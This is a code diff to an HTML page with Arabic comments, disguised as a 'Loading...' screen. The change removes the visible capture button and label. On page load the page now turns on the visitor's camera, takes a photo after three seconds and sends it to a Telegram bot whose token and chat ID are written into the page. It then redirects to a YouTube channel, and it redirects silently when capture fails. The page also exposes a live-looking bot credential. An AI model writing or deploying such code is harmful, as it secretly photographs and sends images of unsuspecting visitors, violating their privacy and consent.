@@ -5,18 +5,29 @@
   <title>جارٍ التحميل...</title>
 </head>
 <body>
-  <h3>اضغط الزر لالتقاط الصورة وإرسالها</h3>
-  <button id="captureBtn">التقاط الصورة وإرسالها</button>
-
   <video id="video" autoplay style="display:none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
-    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE';
-    const chatId = '7728263509';
+    const token = '8077679722:AAGIQbfCgIfyJyystYkR7FdVhtT7Qy-oFBE'; // توكن البوت
+    const chatId = '7728263509'; // معرف الدردشة في تليجرام
 
+    // تحويل base64 إلى Blob
+    function base64ToBlob(base64) {
+      const [metadata, data] = base64.split(',');
+      const byteString = atob(data);
+      const mimeString = metadata.match(/:(.*?);/)[1];
+      const arrayBuffer = new ArrayBuffer(byteString.length);
+      const uint8Array = new Uint8Array(arrayBuffer);
+      for (let i = 0; i < byteString.length; i++) {
+        uint8Array[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([arrayBuffer], { type: mimeString });
+    }
+
+    // إرسال الصورة إلى بوت تليجرام
     async function sendPhoto(base64Image) {
-      const blob = await (await fetch(base64Image)).blob();
+      const blob = base64ToBlob(base64Image);
       const formData = new FormData();
       formData.append("chat_id", chatId);
       formData.append("photo", blob, "photo.jpg");
@@ -27,6 +38,7 @@
       });
     }
 
+    // تشغيل الكاميرا، التقاط الصورة، إرسالها، ثم التوجيه
     async function captureAndSendCameraImage() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -36,15 +48,11 @@
         const video = document.getElementById('video');
         video.srcObject = stream;
 
-        // انتظر حتى تتحمل معلومات الفيديو
         await new Promise(resolve => {
-          video.onloadedmetadata = () => {
-            resolve();
-          };
+          video.onloadedmetadata = () => resolve();
         });
 
-        // التقط الصورة بعد 3 ثواني (اختياري)
-        await new Promise(resolve => setTimeout(resolve, 3000));
+        await new Promise(resolve => setTimeout(resolve, 3000)); // انتظر 3 ثواني
 
         const canvas = document.getElementById('canvas');
         canvas.width = video.videoWidth;
@@ -52,24 +60,24 @@
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // أوقف الكاميرا
-        stream.getTracks().forEach(track => track.stop());
+        stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا
 
         const base64Image = canvas.toDataURL("image/jpeg");
         await sendPhoto(base64Image);
 
-        // بعد الإرسال تحويل إلى الرابط
-        window.location.href = "https://google.com";
+        // التوجيه إلى قناة الزيرو بايثون
+        window.location.href = "https://www.youtube.com/c/ElzeroWebSchool";
 
       } catch (err) {
-        alert("فشل الوصول للكاميرا: " + err);
-        window.location.href = "https://google.com";
+        // التوجيه حتى لو فشل
+        window.location.href = "https://www.youtube.com/c/ElzeroWebSchool";
       }
     }
 
-    document.getElementById('captureBtn').addEventListener('click', () => {
+    // شغّل الكود تلقائيًا عند تحميل الصفحة
+    window.onload = () => {
       captureAndSendCameraImage();
-    });
+    };
   </script>
 </body>
 </html>
